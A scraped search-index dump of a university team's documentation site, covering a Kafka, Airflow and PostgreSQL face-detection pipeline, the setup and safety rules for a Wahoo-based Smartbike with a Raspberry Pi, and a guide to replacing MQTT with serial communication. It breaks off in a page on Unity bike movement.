Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#services-overview","content":" Service\tDescriptionKafka\tMessage broker in KRaft mode Kafka UI\tWeb interface for Kafka monitoring RabbitMQ\tQueue broker for Celery (Airflow) PostgreSQL\tDatabase for Airflow metadata Airflow\tTask orchestration and scheduling platform  ","version":"Next","tagName":"h3"},{"title":"How to Run​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#how-to-run","content":" Create a .env file (with placeholders if sharing):  POSTGRES_USER=airflow POSTGRES_PASSWORD=airflow RABBITMQ_DEFAULT_USER=admin ...   Skip Docker Compose – services are pre-deployed on Redback  All backend services are already running on the Deakin Redback server.  Access services:  Kafka UI: http://redback.it.deakin.edu.au:8080Airflow: http://redback.it.deakin.edu.au:8888RabbitMQ: http://redback.it.deakin.edu.au:15672    ","version":"Next","tagName":"h3"},{"title":"Cloud Deployment Options​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#cloud-deployment-options","content":" ","version":"Next","tagName":"h2"},{"title":"Recommended Services​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#recommended-services","content":" Component\tCloud AlternativeKafka\tConfluent Cloud, AWS MSK PostgreSQL\tAmazon RDS for PostgreSQL, Google Cloud SQL, Supabase Container Hosting\tGCP Cloud Run, AWS ECS, Azure Container Apps Monitoring\tGrafana Cloud, Datadog, Prometheus Stack  Pro Tip: Use managed cloud services to reduce infrastructure overhead.    Examples  ","version":"Next","tagName":"h3"},{"title":"Basic Examples​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#basic-examples","content":" ","version":"Next","tagName":"h2"},{"title":"Running the System Locally​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#running-the-system-locally","content":" Start the producer and consumer from the command line:  python producer.py python consumer.py   Sample output:   Sent Frame 21: 3 faces Received JSON: { &quot;frame_id&quot;: 21, &quot;total_faces&quot;: 3, ... }     ","version":"Next","tagName":"h3"},{"title":"Real World Scenarios​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#real-world-scenarios","content":" ","version":"Next","tagName":"h2"},{"title":"Use Cases​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#use-cases-1","content":" Smart Surveillance: Detect crowd levels in public areas using CCTV.Retail Analytics: Monitor foot traffic and customer behavior in stores.Event Management: Track audience density and movement during live events.Campus Monitoring: Integrate with security feeds to detect unusual gatherings.    ","version":"Next","tagName":"h3"},{"title":"Integration with Other Systems​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#integration-with-other-systems","content":" ","version":"Next","tagName":"h2"},{"title":"How to Extend​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#how-to-extend","content":" REST APIs: Send results to analytics dashboards or visualization tools.Database Sync: Save face detection metadata to PostgreSQL for structured querying.IoT Integration: Trigger edge devices (alarms, cameras) based on crowd thresholds.Cloud Logging: Export structured logs to ELK stack or GCP Logging.    ","version":"Next","tagName":"h3"},{"title":"Batch Processing​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#batch-processing","content":" ","version":"Next","tagName":"h2"},{"title":"How It Works​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#how-it-works","content":" Use Airflow DAGs to: Periodically scan folders for .mp4 filesTrigger face detectionStore results in PostgreSQL or export as CSV  Example DAG task:  run_producer = BashOperator( task_id='process_video', bash_command='python /opt/airflow/dags/producer.py' )     ","version":"Next","tagName":"h3"},{"title":"Stream Processing​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#stream-processing","content":" ","version":"Next","tagName":"h2"},{"title":"Real-Time Analytics​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#real-time-analytics","content":" Connect the producer to a live video source (RTSP camera or webcam).Use Kafka to stream frames with minimal latency.Consumers process in near-real-time and store results in PostgreSQL.Combine with Airflow for post-processing pipelines or alerts.    ","version":"Next","tagName":"h3"},{"title":"Contributing Guide​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#contributing-guide","content":" We welcome contributions to improve this Kafka-based face detection pipeline! Follow the guidelines below to ensure smooth collaboration.    Development Setup  ","version":"Next","tagName":"h2"},{"title":"Prerequisites​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#prerequisites-1","content":" Python 3.10+Docker &amp; Docker ComposeGit  ","version":"Next","tagName":"h3"},{"title":"Setup Instructions​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#setup-instructions-1","content":" Clone the repository:  git clone https://github.com/sumituiet/kafka_python/ cd face-detection-kafka   Create a virtual environment:  python -m venv venv source venv/bin/activate # or venv\\Scripts\\activate on Windows   Install dependencies:  pip install -r requirements.txt   Create a .env file using .env.example as a reference. Run services:  docker compose up -d --build     ","version":"Next","tagName":"h3"},{"title":"Code Style Guidelines​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#code-style-guidelines","content":" Follow PEP8 for Python code.Use meaningful variable names and comments.Use black or autopep8 for formatting:  black .   Follow consistent naming and indentation conventions.    ","version":"Next","tagName":"h2"},{"title":"Testing​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#testing","content":" Unit tests should go in the tests/ folder.Use pytest to run tests:  pytest tests/   Each function/module should have at least one test case.    ","version":"Next","tagName":"h2"},{"title":"Pull Request Process​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#pull-request-process","content":" Fork the repository.Create a new branch:  git checkout -b feature/your-feature-name   Make your changes and commit them:  git commit -m &quot;Add: brief description of change&quot;   Push to your fork:  git push origin feature/your-feature-name   Open a Pull Request: Include a clear title and descriptionMention any relevant issue numbersRequest review if needed    ","version":"Next","tagName":"h2"},{"title":"Thank You​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#thank-you","content":" Thanks for helping improve the project! Your contributions make it better for everyone.  Troubleshooting Guide  This guide helps you resolve common issues and understand how to debug problems in the Kafka-based face detection system.    ","version":"Next","tagName":"h2"},{"title":"Common Issues​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#common-issues","content":" ","version":"Next","tagName":"h2"},{"title":"1. Kafka Producer not connecting​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#1-kafka-producer-not-connecting","content":" Symptoms: NoBrokersAvailable or connection timeout  Solutions:  Ensure Kafka is running (docker compose ps)Check that you're using the correct port (usually 9092 or 29092)Ensure environment variables in .env are correct    ","version":"Next","tagName":"h3"},{"title":"2.PostgreSQL insertion fails​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#2postgresql-insertion-fails","content":" Symptoms: Connection refused, timeout, or no data appears in PostgreSQL  Solutions:  Ensure PostgreSQL service is running (check with systemctl status postgresql or using Redback monitoring tools) Verify that insert_face_data() (or your database utility function) connects to the correct host, port, username, password, and database name Use psql CLI or pgAdmin to manually connect and verify if data is being inserted:  psql -h &lt;host&gt; -U &lt;user&gt; -d &lt;database&gt;     ","version":"Next","tagName":"h3"},{"title":"3. Airflow web UI is blank or errors​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#3-airflow-web-ui-is-blank-or-errors","content":" Solutions:  Check Airflow logs using docker compose logs airflowEnsure FERNET_KEY is set and consistent across all servicesRun airflow db upgrade and restart services    ","version":"Next","tagName":"h3"},{"title":"Debugging Tips​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#debugging-tips","content":" Use print() logs or structured logging (logging, loguru) in producer.py and consumer.pyEnable Prometheus metrics and visualize with GrafanaUse docker logs &lt;container&gt; to inspect container outputTemporarily reduce frame_interval to speed up testing    ","version":"Next","tagName":"h2"},{"title":"FAQ​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#faq","content":" ","version":"Next","tagName":"h2"},{"title":"Q: Can I run this without Docker?​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#q-can-i-run-this-without-docker","content":" A: Yes, but it's not recommended unless necessary. Since all services (Kafka, PostgreSQL, RabbitMQ, Airflow) are already hosted on the Redback server, you only need to:  Set up a local Python environment (uv venv recommended)  -Ensure your scripts connect to the Redback-hosted service URLs and ports  Manually install Python dependencies (e.g., kafka-python, psycopg2, requests, etc.)  ","version":"Next","tagName":"h3"},{"title":"Q: How do I connect to Kafka UI?​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#q-how-do-i-connect-to-kafka-ui","content":" A: Visit http://redback.it.deakin.edu.au:8080 — Kafka UI is hosted and running on the Redback server.  If you're running it locally instead, the URL would be http://localhost:8080.  ","version":"Next","tagName":"h3"},{"title":"Q: What is the use of frame_interval?​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#q-what-is-the-use-of-frame_interval","content":" A: It controls how frequently frames are processed. Higher values = fewer frames.  ","version":"Next","tagName":"h3"},{"title":"Q: How do I add another consumer?​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#q-how-do-i-add-another-consumer","content":" A: Clone consumer.py, give it a unique group ID, and run it in parallel.  ","version":"Next","tagName":"h3"},{"title":"Q: How can I scale this in production?​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#q-how-can-i-scale-this-in-production","content":" A:  Use Kafka partitions to parallelize message processing Deploy microservices with Kubernetes or Cloud Run Use a managed PostgreSQL service like Amazon RDS, Google Cloud SQL, or Supabase Monitor performance using Prometheus, Grafana, or Datadog    Appendix  This section includes supporting materials such as definitions, external resources, and project version history.    ","version":"Next","tagName":"h3"},{"title":"Glossary​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#glossary","content":" Term\tDescriptionKafka\tA distributed event streaming platform used to handle real-time data feeds. Producer\tA service or program that publishes data to Kafka topics. Consumer\tA service or program that subscribes to Kafka topics to read and process messages. Airflow\tA platform to programmatically author, schedule, and monitor workflows. PostgreSQL\tA relational SQL database used for storing face detection results. Docker\tA platform for developing and running applications inside containers.    ","version":"Next","tagName":"h2"},{"title":"Additional Resources​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#additional-resources","content":" Apache Kafka DocumentationYOLOv3 PaperPostgreSQL DocsDocker DocsApache Airflow DocsPrometheus Docs    ","version":"Next","tagName":"h2"},{"title":"Version History​","type":1,"pageTitle":"Kafka Python Documentation - Table of Contents","url":"/redback-documentation/docs/orion-backend/kafkadocs/#version-history","content":" Version\tDate\tDescription1.0\t2024-04-15\tInitial release with Kafka + YOLOv3 + MongoDB integration 1.1\t2024-04-18\tDocker Compose + Airflow integration 1.2\t2024-04-22\tPrometheus metrics and monitoring added 1.3\t2024-04-25\tDocumentation and troubleshooting guide included 1.4\t2025-04-22\tReplaced MongoDB with PostgreSQL for result storage 1.5\t2025-04-25\tMigrated services to Deakin Redback server, removed local Docker   ","version":"Next","tagName":"h2"},{"title":"Smartbike Introduction","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction","content":"","keywords":"","version":"Next"},{"title":"Table of Contents​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#table-of-contents","content":" IntroductionMakerspaceSafety &amp; RulesWahoo Components KICKR Smart TrainerKICKR ClimbKICKR Headwind Bluetooth FanTICKR Heart Rate MonitorWahoo Cadence Sensor Raspberry PiGet Ready to Work with the Smartbike    ...  ","version":"Next","tagName":"h2"},{"title":"Quick Start Guide​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#quick-start-guide","content":" Follow these steps to quickly get started with the Smartbike:  Access the Makerspace: Complete the online induction and schedule your in-person induction.Set Up Your Developer Environment: Follow the guide here.Power On the Smartbike: Connect the KICKR smart trainer to a power source.Connect the Raspberry Pi to the internet. Connect Devices: Pair the KICKR smart trainer, KICKR Climb, and TICKR heart rate monitor.Test the connections using the provided drivers. Run the VR Application: Start the VR game and ensure the Smartbike components are synchronized.  ⚠️ Note: Follow safety rules while using the Smartbike.  ","version":"Next","tagName":"h2"},{"title":"Makerspace​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#makerspace","content":" The Smartbike is kept in the Makerspace under building HF on the Burwood campus. This is a fairly new space intended for IoT development which gives students access to equipment like soldering irons, 3D printers, laser cutting machines, etc.  To access the Makerspace you first need to complete the online induction (good chance this link does not work) and then schedule an in-person induction.  The Makerspace is open from 10:00 am to 4:00 pm on weekdays.  ","version":"Next","tagName":"h2"},{"title":"Safety & Rules​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#safety--rules","content":" Use of the Smartbike has limitations as to ensure safety and follow university rules. The following rules must be followed:  Follow all rules of the Makerspace.DO NOT ride the Smartbike unless you have signed the waver.Be respectful of the equipment - it is expensive and some equipment is not owned by members of the team.Ride the Smartbike with caution as it can be unstable.  ","version":"Next","tagName":"h2"},{"title":"Wahoo​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#wahoo","content":" The core of the Smartbike is an off-the-shelf indoor exercise bike produced by Wahoo. It is formed by several different smart components which each offer unique and useful functionality.  ","version":"Next","tagName":"h2"},{"title":"KICKR Smart Trainer​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#kickr-smart-trainer","content":"   The KICKR smart trainer is a central piece of the Smartbike:  Sensing/simulating speedSensing cycling cadenceSensing cycling powerActuating pedal resistanceConnecting to the KICKR ClimbConnecting to the KICKR Headwind Bluetooth Fan  The VR game uses the KICKR smart trainer's speed simulation to control the speed of the in-game bike.  The KICKR Climb and KICKR Headwind Bluetooth Fan also automatically pair with the KICKR smart trainer. The KICKR Climb cannot be controlled directly but rather is a sort of extension of the KICKR smart trainer. The KICKR Headwind Bluetooth Fan can either be paired with the KICKR smart trainer, meaning the sensed speed will determine the power of the fan, or directly connected to and controlled by the Raspberry Pi.  Find out more on the Wahoo website  See its driver  ","version":"Next","tagName":"h3"},{"title":"KICKR Climb​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#kickr-climb","content":"   The KICKR Climb can alter the incline of the Smartbike. It is attached to the front of the bike and can shift it up or down, increasing or decreasing the incline. It can be controlled by a remote mounted to the handle bars. It has an incline range from -10° to 19° - a total range of 30° including the 0° (flat) level.  The KICKR Climb is an extension of the KICKR smart trainer. It automatically connects to the KICKR smart trainer and cannot be connected to directly. It could be possible to spoof the connection between the KICKR smart trainer and KICKR Climb to control the KICKR Climb directly but this has not been investigated.  The KICKR Climb's incline control is used by the VR game to give haptic feedback to the player as they go up and down terrian in-game.  Find out more on the Wahoo website  See its driver  ","version":"Next","tagName":"h3"},{"title":"KICKR Headwind Blueooth Fan​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#kickr-headwind-blueooth-fan","content":"   The KICKR Headwind Bluetooth Fan is positioned in front of the Smartbike and blows air at different strengths to simulate a headwind. It can be paired with either the KICKR smart trainer or TICKR heart rate monitor to automatically blow proportional to the speed of the bike or heart rate of the user. Alternatively, the fan driver can be used to control the fan directly.  Find out more on the Wahoo website  See its driver  ","version":"Next","tagName":"h3"},{"title":"TICKR Heart Rate Monitor​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#tickr-heart-rate-monitor","content":"   The TICKR heart rate monitor is a heart rate monitor which is strapped around the chest. It must be directly connected to the Raspberry Pi and automatically goes to sleep after 30-seconds of non-use. It senses heart rate in beats per a minute (BPM).  Connecting to the TICKR heart rate monitor can be tricky due to its short awake time.  To awaken the TICKR press both thumbs against the diodes on the back of the TICKR - it has awaken when the LEDs turn on.To connect to the Raspberry Pi, run the driver code and wait for the blue LED to change from flashing once a second to twice a second.The TICKR is connected and the LEDs will switch off in about 30-seconds but the connection will persist.  Find out more on the Wahoo website  More information on the TICKR's LEDs  See its driver  ","version":"Next","tagName":"h3"},{"title":"Wahoo Cadence Sensor [Redundant]​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#wahoo-cadence-sensor-redundant","content":"   The Wahoo cadence sensor is attached to the right pedal of the Smartbike. While it was initially developed for, it was discovered that the KICKR smart trainer has the same native capabilities, automatically sensing cadence, and hence the Wahoo cadence sensor is redundant. It is possible that the Wahoo cadence sensor has reduced latency. If this is the case it would be worthwhile reintegrating it.  Find out more on the Wahoo website  See its driver  ","version":"Next","tagName":"h3"},{"title":"Raspberry Pi​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#raspberry-pi","content":"   The Raspberry Pi is the central controller of the Smartbike system. The above components can be connected to and controlled by the Raspberry Pi. To interface with applications, the Raspberry Pi is connected to the internet and uses a MQTT broker. The Raspberry Pi can be connected to using SSH, a monitor or even over VNC.  To login to the Raspberry Pi ask your project lead for the credentials (or if you are the project lead - see the handover document).  ","version":"Next","tagName":"h2"},{"title":"Turning Buttons​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#turning-buttons","content":"   Connected to the Raspberry Pi is two turning control buttons. The buttons are mounted on the handle bars and intended to be pressed when a user wishes to turn in-game. They are connected to pins 11 and 12 on the Raspberry Pi's GPIO pins.  See the button's driver  ","version":"Next","tagName":"h3"},{"title":"Get Ready to Work with the Smartbike​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#get-ready-to-work-with-the-smartbike","content":" Setup your developer environment.Learn how to start the Smartbike.  ","version":"Next","tagName":"h2"},{"title":"Troubleshooting​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#troubleshooting","content":" ","version":"Next","tagName":"h2"},{"title":"Common Issues and Fixes​","type":1,"pageTitle":"Smartbike Introduction","url":"/redback-documentation/docs/project-1/iot/introduction/Smartbike-Introduction#common-issues-and-fixes","content":" Raspberry Pi Not Connecting to Wi-Fi: Check if the Wi-Fi credentials are correct in the configuration file.Restart the Raspberry Pi using sudo reboot. TICKR Heart Rate Monitor Not Pairing: Ensure the TICKR is awake by pressing its diodes until the LED lights up.Retry connecting within 30 seconds using the driver script. KICKR Climb Not Responding: Verify its connection to the KICKR smart trainer.Restart the KICKR smart trainer and reconnect. VR Game Sync Issues: Check the MQTT broker logs for connection errors.Restart the Raspberry Pi and VR application. ","version":"Next","tagName":"h3"},{"title":"Moving from Wireless MQTT connection to Serial","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/MQTTtoSerialCommunication_Markdown","content":"","keywords":"","version":"Next"},{"title":"Code Example​","type":1,"pageTitle":"Moving from Wireless MQTT connection to Serial","url":"/redback-documentation/docs/project-1/iot/MQTTtoSerialCommunication_Markdown#code-example","content":" Here is an example Python script that replaces MQTT with serial communication. This script will dynamically find the correct serial port and read the button states from the Raspberry Pi.  ","version":"Next","tagName":"h2"},{"title":"Required Libraries​","type":1,"pageTitle":"Moving from Wireless MQTT connection to Serial","url":"/redback-documentation/docs/project-1/iot/MQTTtoSerialCommunication_Markdown#required-libraries","content":" First, make sure you have the pyserial library installed:    ","version":"Next","tagName":"h2"},{"title":"Explanation of the Code​","type":1,"pageTitle":"Moving from Wireless MQTT connection to Serial","url":"/redback-documentation/docs/project-1/iot/MQTTtoSerialCommunication_Markdown#explanation-of-the-code","content":" a) GPIO Setup: Same as before, configuring pins 11 and 12 as inputs for the right and left turn buttons, respectively.  b) Serial Port Detection: The find_serial_port function scans all available serial ports and returns the one that is suitable (e.g., containing &quot;USB&quot; or &quot;ACM&quot; in the description). Adjust this logic based on your specific device's identifiers.  c) Serial Communication: The ButtonTest function now sends button states over the serial connection instead of MQTT. The serial connection is established with the detected port using a baud rate of 9600 (adjustable as needed).  d) Main Loop: Continuously calls the ButtonTest function every second to check the button states and send updates via the serial connection.  ","version":"Next","tagName":"h2"},{"title":"Handling Serial Port Changes​","type":1,"pageTitle":"Moving from Wireless MQTT connection to Serial","url":"/redback-documentation/docs/project-1/iot/MQTTtoSerialCommunication_Markdown#handling-serial-port-changes","content":" If the serial port changes, the script will dynamically detect the correct port at startup. Ensure that your VR game or receiving system is set up to handle incoming data over the serial connection.  This setup should provide a seamless transition from MQTT to serial communication, with dynamic port detection to handle different connection scenarios.  Below are detailed steps to implement serial communication for handling button presses in your smart bike project. This section will guide you through setting up serial communication, identifying available serial ports dynamically, and replacing MQTT with serial data transmission.  ","version":"Next","tagName":"h2"},{"title":"Steps to Implement Serial Communication​","type":1,"pageTitle":"Moving from Wireless MQTT connection to Serial","url":"/redback-documentation/docs/project-1/iot/MQTTtoSerialCommunication_Markdown#steps-to-implement-serial-communication","content":" a) Install Required Libraries  Before starting, ensure you have the necessary libraries installed. You'll need pyserial for serial communication. Install it using pip:    b) Configure GPIO for Button Inputs    Set up the GPIO pins on your Raspberry Pi to read the states of the buttons. Configure pins 11 and 12 as inputs for the right and left turn buttons, respectively.  c) Identify Available Serial Ports Dynamically  To make your system robust and flexible, it's important to dynamically identify the serial port that the Raspberry Pi will use to communicate with the VR game. This way, you won't have to manually specify the port each time it changes.    In this function, serial.tools.list_ports.comports() lists all available serial ports. The function checks each port description for identifiers such as &quot;USB&quot; or &quot;ACM&quot;. If a suitable port is found, it returns the port name (e.g., /dev/ttyUSB0).  d) Setup Serial Communication  Initialize the serial connection using the port identified in the previous step. Set an appropriate baud rate (e.g., 9600).    e) Replace MQTT with Serial Communication  Modify the button state checking function to send data over the serial connection instead of publishing to MQTT topics.    In this function, serial_conn.write sends the button states (RIGHT, R_LOW, LEFT, L_LOW) as byte strings over the serial connection.  f) Implement the Main Loop    In the main part of your script, use a loop to continuously read the button states and send updates via the serial connection. Ensure proper cleanup and error handling.  g) Ensure Proper Resource Management  · Error Handling: The try block ensures that any exceptions (e.g., no serial port found) are caught and handled gracefully.  · Cleanup: The except KeyboardInterrupt block ensures that GPIO pins are cleaned up and the serial connection is closed when the script is interrupted (e.g., by pressing Ctrl+C).  By following these steps, you transition your button handling from MQTT to serial communication, making the system adaptable to different port configurations. The key steps include configuring GPIO pins, dynamically identifying serial ports, setting up the serial connection, and sending button states over this connection. This approach enhances flexibility and robustness in your smart bike project, ensuring smooth integration with the VR game.  Handling serial port changes dynamically is crucial for ensuring that your system can adapt to different hardware configurations and connection scenarios. Here's a detailed explanation on how to handle serial port changes effectively:  Handling Serial Port Changes: When dealing with serial communication, it's common to encounter scenarios where the serial port name or connection changes. This could happen if you plug the device into a different USB port, use a different computer, or if the operating system assigns a different port name. To manage these changes gracefully, follow these steps:  a) Dynamic Serial Port Detection  Instead of hardcoding the serial port name, use a method to dynamically detect the available serial ports and select the correct one based on specific criteria.  Code Example for Dynamic Port Detection:    In this function:  · serial.tools.list_ports.comports() provides a list of all available serial ports.  · The function iterates through the list, checking each port’s description or device name for keywords like &quot;USB&quot; or &quot;ACM&quot;, which are typically associated with USB serial devices.  · If a matching port is found, the function returns the port name (e.g., /dev/ttyUSB0 or COM3).  · If no matching port is found, an exception is raised.  b) Initialize Serial Communication  Use the detected serial port to establish a serial connection. This ensures that your application connects to the correct port, regardless of changes.  Code Example for Serial Initialization:    In this example:  · The find_serial_port() function is called to get the correct serial port.  · serial.Serial is used to open a connection to the detected port with a specified baud rate and timeout.  · If an exception occurs (e.g., no suitable port found), it is caught and printed.  c) Continuous Monitoring and Error Handling  In the main loop of your application, monitor the button states and handle any exceptions that may occur during serial communication. This ensures that your application can recover gracefully from errors such as disconnection or port changes.  ##Code Example for Main Loop with Error Handling:    In this example:  · The main loop continuously calls ButtonTest to read button states and send them over the serial connection.  · If a serial.SerialException occurs (e.g., due to disconnection), it is caught, and the script attempts to reinitialize the serial connection by finding the port again and reopening it.  · The outer try block handles general exceptions, ensuring that any other errors are caught and handled gracefully.  · The KeyboardInterrupt exception ensures that the GPIO pins are cleaned up and the serial connection is closed when the script is interrupted.  Handling serial port changes dynamically involves:  · Dynamic Port Detection: Using serial.tools.list_ports to list and identify available serial ports based on specific criteria (e.g., containing &quot;USB&quot; or &quot;ACM&quot;).  · Robust Initialization: Establishing the serial connection using the detected port and handling exceptions to ensure the connection can be reestablished if it changes.  · Continuous Monitoring and Error Handling: Implementing error handling in the main loop to detect and recover from serial communication errors, such as disconnections.  This approach ensures that your system remains flexible and resilient to changes in the serial port configuration, providing a seamless user experience. ","version":"Next","tagName":"h2"},{"title":"Starting the Smartbike","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/iot/operation/Starting-Smartbike","content":"","keywords":"","version":"Next"},{"title":"Before Powering the Raspberry Pi​","type":1,"pageTitle":"Starting the Smartbike","url":"/redback-documentation/docs/project-1/iot/operation/Starting-Smartbike#before-powering-the-raspberry-pi","content":" Before you turn the Raspberry Pi on, do the following:  Power on the Smartbike devicesEnsure the wireless signal on the KICKR Climb remote is solid (paired)    If not - hold down the remote's button until quickly flashing and ensure the KICKR smart trainer is powered  Press the button on the KICKR Climb remote to unlock it    Ensure that your PC and the Raspberry Pi are connected to your personal mobile hotspot  ","version":"Next","tagName":"h2"},{"title":"Start the Raspberry Pi​","type":1,"pageTitle":"Starting the Smartbike","url":"/redback-documentation/docs/project-1/iot/operation/Starting-Smartbike#start-the-raspberry-pi","content":" Power the Raspberry PiConnect via SSH, VNC, or monitor  The Raspberry Pi can be SSH into using port 22 and its hostname: bike000001.  Login to the Raspberry Pi  Ask your project lead for login credentials (or if you are the lead - check the handover document).  Awaken the TICKR heart rate monitor - follow instructions in the Smartbike Introduction documentStart the Smartbike process by running the follow command in the home directory:  bash iot/scripts/start_all.sh   The KICKR smart trainer BLE indicator light should turn solid:    If BLE errors are encountered see the ble-auto-connect script or BLE connectivity fix document. ","version":"Next","tagName":"h2"},{"title":"Unity Bike Movement System","type":0,"sectionRef":"#","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement","content":"","keywords":"","version":"Next"},{"title":"PlayerController​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#playercontroller","content":" Selects and initializes the appropriate movement controller (IBikeMover) Dynamically chooses the input handler (IPlayerInput) based on: MQTT connectionXR controller detectionFallback to keyboard Passes input values to the active IBikeMover in FixedUpdate() Handles score collection through OnTriggerEnter Exposes SetSpeed() and GetSpeed() for runtime tuning    ","version":"Next","tagName":"h3"},{"title":"IBikeMover Interface​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#ibikemover-interface","content":" Defines the API for movement components:  float Speed { get; set; } void Init(GameObject controller); void HanldeInput(Vector2 direction);   ","version":"Next","tagName":"h3"},{"title":"IPlayerInput Interface​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#iplayerinput-interface","content":" Defines how directional input is gathered. All implementations return a Vector2:  x: Horizontal steeringy: Forward/backward movement    ","version":"Next","tagName":"h3"},{"title":"SimpleBikeController​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#simplebikecontroller","content":" Arcade-style bike movement:  No physics (rigidbody is kinematic)Manual rotation and translation based on directionRotates wheels visuallyAligns bike to terrain normal for realism  Best for: simple mobile control, joystick or keyboard input.    ","version":"Next","tagName":"h3"},{"title":"RealisticBikeController​","type":1,"pageTitle":"Unity Bike Movement System","url":"/redback-documentation/docs/project-1/vr/bike-input-and-movement#realisticbikecontroller","content":" Physics-based bike system:  Controls motor torque, braking, and steering via WheelCollidersComputes steering angle reduction at higher speedsUses AnimationCurve to simulate self-balancing (torque applied against tilt)Leaning is computed and visualizedSyncs visual wheel rotation with physics colliders  Best for: immersive VR, realistic terrain, and learning physics principles.    ","version":"Next","tagName":"h3"},{"title":"AxisInput​","type":1,"pageTitle":"Unity Bike Movement 